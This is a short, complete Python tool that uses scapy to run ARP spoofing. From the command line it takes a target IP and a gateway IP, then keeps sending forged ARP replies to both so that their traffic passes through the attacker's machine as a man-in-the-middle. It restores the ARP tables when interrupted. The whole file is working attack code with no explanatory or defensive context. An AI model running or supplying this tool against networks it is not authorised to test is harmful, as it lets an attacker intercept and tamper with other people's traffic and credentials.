#!/usr/bin/env python3

import scapy.all as scapy
from time import sleep
import optparse


def getArguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip", help="IP of target device")
    parser.add_option("-g", "--gateway", dest="gateway_ip", help="IP of gateway")
    (options, arguments) = parser.parse_args()
    if not options.target_ip:
        parser.error("[-] Please specify ip address of target, use --help for more info")
    elif not options.gateway_ip:
        parser.error("[-] Please specify ip address of gateway, use --help for more info")
    return options.target_ip, options.gateway_ip


def getMac(ip):
    arpRequest = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    broadcastArpRequest = broadcast / arpRequest
    answeredList = scapy.srp(broadcastArpRequest, timeout=1, verbose=False)[0]
    return answeredList[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=getMac(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=getMac(destination_ip), psrc=source_ip, hwsrc=getMac(source_ip))
    scapy.send(packet, count=4, verbose=False)


target_ip, gateway_ip = getArguments()

try:
    packet_sent_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        packet_sent_count += 2
        print("\r[+] Packet sent: " + str(packet_sent_count), end="")
        sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected Ctrl + C.....Resetting ARP tables....Please Wait")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
